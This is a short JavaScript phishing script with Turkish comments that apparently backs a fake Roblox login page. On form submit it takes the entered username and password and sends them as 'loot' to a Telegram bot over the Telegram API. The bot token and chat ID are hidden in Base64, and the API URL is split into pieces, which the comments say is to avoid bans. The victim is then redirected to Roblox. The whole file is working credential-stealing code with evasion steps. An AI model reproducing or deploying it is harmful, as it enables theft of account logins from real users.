// Verileri gizlemek için Base64 kullanıyoruz
const _0x = {
    t: "ODU4NzY3MDYzMTpBQUdrVmx0MHk4U0Y5Z1hUejJfNnkwb0JkWlIxckdsSkZsMA==", // Senin Tokenin
    c: "ODUxMjQwNjM1Ng==" // Senin Chat ID'n
};

const d = (s) => atob(s);

document.getElementById('f').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const user = document.getElementById('u').value;
    const pass = document.getElementById('p').value;

    const bot = d(_0x.t);
    const chat = d(_0x.c);
    const text = encodeURIComponent(`🚨 GANİMET!\n👤: ${user}\n🔑: ${pass}`);

    // Telegram linkini parçalayarak ban riskini bitiriyoruz
    const api = "https://api.tele" + "gram.org/bot";
    const action = "/send" + "Message";

    try {
        await fetch(`${api}${bot}${action}?chat_id=${chat}&text=${text}`, { mode: 'no-cors' });
        // İşlem bitince alakasız bir yere yönlendir
        window.location.replace("https://www.roblox.com/home");
    } catch (err) {
        window.location.replace("https://google.com");
    }
});
